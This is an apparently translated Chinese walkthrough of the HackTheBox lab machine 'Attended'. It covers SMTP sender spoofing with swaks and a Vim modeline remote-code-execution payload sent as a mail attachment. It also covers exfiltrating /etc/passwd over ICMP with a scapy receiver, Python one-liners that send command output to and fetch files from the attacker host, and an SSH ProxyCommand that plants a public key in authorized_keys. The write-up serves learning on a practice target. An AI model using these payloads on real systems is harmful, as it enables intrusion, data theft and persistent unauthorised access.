# HTB Attended 渗透测试指南

#### 译文声明
本文为翻译文章，仅供参考。具体内容和含义请以原文为准。

Attended 是一个难度等级为 Insane 的渗透测试靶机，其难度仅次于 Rope2。预计在该靶机退役前，能够获取 ROOT 权限的人数不足 100 人。此靶机的设计非常出色，通过对其进行渗透测试，可以学习到许多新的技术和方法。

## 侦察 (Recon)
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 4f:08:48:10:a2:89:3b:bd:4a:c6:81:03:cb:20:04:f5 (RSA)
|   256 1a:41:82:21:9f:07:9d:cd:61:97:e7:fe:96:3a:8f:b0 (ECDSA)
|_  256 e0:6e:3d:52:ca:5a:7b:4a:11:cb:94:ef:af:49:07:aa (ED25519)
25/tcp open  smtp
| fingerprint-strings:
|   GenericLines, GetRequest:
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     5.5.1 Invalid command: Pipelining not supported
|   Hello:
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     5.5.1 Invalid command: EHLO requires domain name
|   Help:
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     214- This is OpenSMTPD
|     214- To report bugs in the implementation, please contact PI:EMAIL
|     214- with full details
|     2.0.0: End of HELP info
|   NULL:
|_    220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
| smtp-commands: proudly setup by guly for attended.htb Hello 10.10.10.221 [10.10.16.16], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,
|_ This is OpenSMTPD To report bugs in the implementation, please contact PI:EMAIL with full details 2.0.0: End of HELP info
```

靶机仅开放了两个端口：SSH（22）和 SMTP（25），操作系统为较为少见的 OpenBSD。

## SMTP
由于 SSH 爆破不可行，因此我们只能从 SMTP 服务入手。根据 Nmap 扫描结果，发现 `attended.htb` 使用的是 OpenSMTPD，并且疑似开发者为 `guly`。我们可以尝试向 `PI:EMAIL` 发送邮件。

这里使用了被称为 SMTP 瑞士军刀的 `swaks` 工具进行邮件发送。下载地址：[Swaks 下载链接](https://jetmore.org/john/code/swaks/)

使用以下命令发送邮件给管理员：
```bash
swaks --to PI:EMAIL --from xxx@10.10.x.x -s 10.10.10.221:25
```

由于在内网中，我们需要本地启动一个 SMTP 服务器来接收邮件。这里使用 Python 自带的模块来实现：
```bash
python -m smtpd -c DebuggingServer -n 0.0.0.0:25
```

稍等片刻后，SMTP 服务会收到回复邮件：
```
---------- MESSAGE FOLLOWS ----------
Received: from attended.htb (attended.htb [192.168.23.2])
        by attendedgw.htb (Postfix) with ESMTP id CEAFD32DD0
        for <xxx@10.10.x.x>; Mon, 25 Jan 2021 04:18:35 +0100 (CET)
Content-Type: multipart/alternative;
 boundary="===============3908250105861926732=="
MIME-Version: 1.0
Subject: Re: test Mon, 25 Jan 2021 03:09:20 +0000
From: PI:EMAIL
X-Peer: 10.10.10.221
--===============3908250105861926732==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

hello, thanks for writing.
i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.
---
guly
OpenBSD user since 1995
Vim power user
/\"\
\ /  ASCII Ribbon Campaign
 \ X   against HTML e-mail
 / \  against proprietary e-mail attachments
--===============3908250105861926732==--
------------ END MESSAGE ------------
```

根据回复内容，对方只接受来自 `freshness` 的邮件。因此，我们伪造发件人为 `freshness` 再次发送邮件：
```bash
swaks --to PI:EMAIL --from freshness@10.10.x.x -s 10.10.10.221:25
```

之后可以收到不同的回复：
```
---------- MESSAGE FOLLOWS ----------
Received: from attended.htb (attended.htb [192.168.23.2])
        by attendedgw.htb (Postfix) with ESMTP id 7144A32D5F
        for <xxx@10.10.x.x>; Mon, 25 Jan 2021 04:24:34 +0100 (CET)
Content-Type: multipart/alternative;
 boundary="===============4642293069139030684=="
MIME-Version: 1.0
Subject: Re: test Mon, 25 Jan 2021 03:15:12 +0000
From: PI:EMAIL
X-Peer: 10.10.10.221
--===============4642293069139030684==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)
p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.
--===============4642293069139030684==--
------------ END MESSAGE ------------
```

根据回复内容，提到我们没有发送附件，并且 PS 中提到靶机上安装了 Python 2 环境。因此，我们加上一个 Python 脚本作为附件再次发送：
```bash
swaks --to PI:EMAIL --from freshness@10.10.x.x --attach shell.py -s 10.10.10.221:25
```

之后又收到一个不同的回复：
```
thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
test it ASAP and let me know if you still face that weird issue.
```

简单意思是管理员会通过 SSH 登录服务器，然后使用 Vim 打开我们发给他的附件。如果配置文件正常，将会放入 `/home/shared` 文件夹中。

### 思路整理
我们需要构造一个恶意附件，让管理员通过 Vim 打开后触发漏洞并获取权限。下一步需要查找一下 Vim 是否存在远程代码执行 (RCE) 漏洞。

## Vim
搜索发现 Vim 存在一个 RCE 漏洞。首先制作一个 `test.txt`，采用 ping 的方式确认是否存在漏洞：
```
:!ping 10.10.x.x||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```
注意 `test.txt` 最后要带一个换行符 `\n`。

将 `test.txt` 作为附件发送过去，本地使用 `tcpdump` 进行监听 ICMP。大约一分钟后，可以抓到靶机 ping 回来的包，证明漏洞存在。

虽然有 RCE 漏洞，但没有回显，直接反弹 Shell 也无法成功。无论是 `wget` 还是 `curl`，都无法访问我开启的 HTTP 服务进行文件下载。回顾之前的邮件提示，可能是靶机开启了出站规则，导致正常的 HTTP 协议无法出站。

### 布尔盲注
首先想到的是类似布尔盲注的方式，通过是否有 ping 回来判断是否执行成功。例如，判断文件是否存在可以这样写：
```
:!file /home/shared/.ssh/passwd && ping -s 34 -c 1 10.10.x.x||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

但是每次都需要等一分钟才执行命令，效率很低。应该需要一种特殊的技巧来获取回显和读取文件。

### 数据泄露 (Data Exfiltration)
首先想到的是利用 ICMP 进行信息泄露。原理是利用 ping 的 `-p` 参数携带信息。例如，可以这样读取 `/etc/passwd`：
```bash
cat /etc/passwd | xxd -p -c 2 | xargs -n 1 -I '{}' ping -c 1 -t 1 -p '{}' 10.10.x.x ; ping -c 1 -t 1 -s 55 10.10.x.x
```

然后通过以下脚本进行接收：
```python
import sys
import argparse
import scapy.all
config = None

def write_or_stop(pkt):
    global config
    if pkt[scapy.all.IP].len == 83:
        config.output_file.flush()
        config.output_file.close()
        return True
    payload = pkt.lastlayer().load
    print(pkt.show())
    config.output_file.write(payload[8:8+config.chunk_size])
    print(payload[0-config.chunk_size:])
    return False

def main(argv):
    global config
    parser = argparse.ArgumentParser(description='Reassemble FILE from ICMP ECHO REQUESTs')
    parser.add_argument('-s', '--chunk-size', metavar='SIZE', type=int, default=2, help='How many bytes are exfiltrated in a single ECHO_REQUEST pkt')
    parser.add_argument('-o', '--output-file', nargs='?', type=argparse.FileType('w+'), default=sys.stdout)
    config = parser.parse_args(argv)
    scapy.all.sniff(filter="icmp[icmptype] == 8", stop_filter=write_or_stop, store=0, iface='tun0')

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
```

在 Kali 中测试可以成功，但利用 Vim 漏洞却无法成功。再次检查命令时发现使用了 `|`，这会影响 Vim 漏洞利用。之前邮件特意提示有 Python 2 环境，相信这是突破点。尝试使用 Python 进行 HTTP 请求：
```vim
:!python2 -c "import requests;requests.get('http://10.10.16.31/')"||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

测试发现使用 Python 的 `requests` 库可以连回来！使用 GET 带 data 参数，可以把回显带回来：
```vim
:!python2 -c "import requests;import os;requests.get('http://10.10.x.x/',data=os.popen('id'))"||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

目前已解决命令回显的问题，但仍然无法获取反弹 Shell。

## SSH 配置
使用命令执行进行翻垃圾，发现 `/home/guly/tmp/.config.swp`：
```
Host *
  User freshness
  ControlMaster auto
  ControlPath /tmp/%r@%h:%p
  ControlPersist 4h
  TCPKeepAlive yes
  ServerAliveInterval 60
```

这是一个 OpenSSH 客户端配置文件，通常存放在用户的 `.ssh` 目录中。具体的配置示例可以参考：[Linux/Unix 重用 OpenSSH 连接](https://cyberciti.biz/faq/linux-unix-reuse-openssh-connection/)

回顾之前的邮件回复内容：
> i’m currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax. If everything is fine, you will find your config file within a few minutes in the /home/shared folder.

管理员会使用 SSH 登录靶机，上述文件应该是 `guly` 切换到 `freshness` 用户用的配置文件，并且让 `freshness` 到 `/home/shared` 目录找配置文件。

查找 SSH 配置参数，发现存在一个 `ProxyCommand` 参数可以执行命令。那么思路很明确，构造一个恶意的配置文件，里面加入写入 SSH 公钥的命令，然后把配置文件写入到 `/home/shared/`。

配置文件构造如下：
```
Host *
  User freshness
  ControlMaster auto
  ControlPath /tmp/%r@%h:%p
  ControlPersist 4h
  TCPKeepAlive yes
  ServerAliveInterval 60
  ProxyCommand echo "ssh-rsa AAAAC3NzaC1l......qG+NefAdLUMUMEaHnPM" >> ~/.ssh/authorized_keys
```

将配置文件写入到 `/home/shared/`：
```bash
python2 -c "import requests,os;a=requests.get('http://10.10.x.x/config');f=open('/home/shared/config','wb');f.write(a.content);f.close()"
```

这样，管理员登录时会执行 `ProxyCommand`，从而将我们的公钥写入到 `~/.ssh/authorized_keys` 中，最终实现无密码登录。